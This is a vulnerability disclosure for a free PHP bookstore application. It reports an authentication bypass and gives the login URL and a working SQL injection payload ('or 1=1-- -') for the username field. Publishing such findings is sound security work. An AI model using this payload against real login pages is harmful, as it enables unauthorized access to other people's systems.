# Online Book System - Authentication Bypass
+ **Exploit Title:** Online Book System - Authentication Bypass
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System allows Authentication Bypass via the `username` and `Password` parameters at "localhost/BookStore-master 1/index.php". 

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/index.php"
+ username : `'or 1=1-- -` Password : `1`  and log in
+ Authentication Bypass Successful !

![book system auth bypass with sqli](https://github.com/BurakSevben/CVEs/assets/117217689/8302f544-7502-4dac-9d3e-f958cbc27a66)

![book system auth bpyass 2](https://github.com/BurakSevben/CVEs/assets/117217689/97c2a66b-6548-4d7c-b8c3-e5dfc6a49129)
